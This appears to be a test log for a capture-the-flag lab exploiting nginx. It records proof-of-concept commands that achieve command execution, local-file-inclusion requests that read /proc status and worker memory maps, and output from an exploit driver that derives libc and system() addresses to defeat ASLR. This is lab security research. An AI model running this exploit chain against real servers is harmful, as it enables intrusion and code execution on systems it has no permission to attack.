# Nginx Rift CTF Tests

Last updated: 2026-05-14 22:59:05 CEST

## Baseline: Original PoC Command Execution

Purpose: prove the known-good PoC still performs command execution in the original lab, not just worker crashes.

Commands:

```bash
docker compose -f env/docker-compose.yml up -d --build --force-recreate
./poc.py --host 127.0.0.1 --port 19321 --cmd 'echo rift-default-ok > /tmp/rift_default_marker'
docker compose -f env/docker-compose.yml exec -T nginx sh -lc 'ls -l /tmp/rift_default_marker && cat /tmp/rift_default_marker'
```

Observed:

```text
[+] try 1/10 crashed - system("echo rift-default-ok > /tmp/rift_default_marker") executed
-rw-r--r-- 1 nobody nogroup ... /tmp/rift_default_marker
rift-default-ok
```

Status: pass.

## Same-Port LFI: PHP Process Identity

Purpose: confirm the PHP LFI primitive runs as the same non-root UID expected for nginx workers.

Command:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/self/status' | sed -n '1,12p'
```

Observed:

```text
Name: php-fpm8.1
Uid: 65534 65534 65534 65534
Gid: 65534 65534 65534 65534
```

Status: pass.

## Same-Port LFI: Worker Discovery

Purpose: discover nginx worker PID without Docker introspection.

Commands:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/app/tmp/nginx.pid'
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/7/task/7/children'
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/<candidate>/status'
```

Observed in current same-port run:

```text
/app/tmp/nginx.pid: 7
/proc/7/task/7/children: 9 14
nginx worker UID: 65534
```

Status: pass.

## Same-Port LFI: Nginx Worker Maps

Purpose: verify PHP LFI can read the target nginx worker memory map.

Command:

```bash
curl -sS 'http://127.0.0.1:19321/lfi.php?file=/proc/<nginx-worker>/maps' | grep -E '/nginx$|libc\.so|\[heap\]'
```

Observed:

```text
555555554000-555555576000 r--p ... /nginx-src/build/nginx
555555659000-55555566f000 rw-p ... /nginx-src/build/nginx
7ffffefc0000-7ffffefe8000 r--p ... /usr/lib/x86_64-linux-gnu/libc.so.6
```

Status: pass.

## Remote-Only Driver: Map And Libc Derivation

Purpose: derive ASLR-sensitive target facts through HTTP-only primitives.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --tries-per-candidate 10 --verbose
```

Observed:

```text
Nginx worker PID discovered over LFI
Nginx writable image mapping: 0x555555659000
libc base/path from worker maps: 0x7ffffefc0000 /usr/lib/x86_64-linux-gnu/libc.so.6
system() offset from LFI-read libc ELF: 0x50d70
system() absolute address: 0x7fffff010d70
URI-safe candidate cleanup addresses: 5 / 20
```

Result: no marker proof. Attempts caused worker disruption only.

Status: partial pass. Address derivation works; exploitation proof has not landed in same-port CTF mode.

## Next Test: Same-Port Core-Guided Mode

Purpose: evaluate whether an LFI-readable core dump can recover the actual sprayed payload address remotely.

Command:

```bash
./ctf_remote_exploit.py --host 127.0.0.1 --port 19321 --core-guided --tries-per-candidate 10 --verbose
```

Expected pass condition:

```text
[+] CTF win: marker /tmp/nginx_rift_ctf_<id> contains token ...
```

Status: queued.
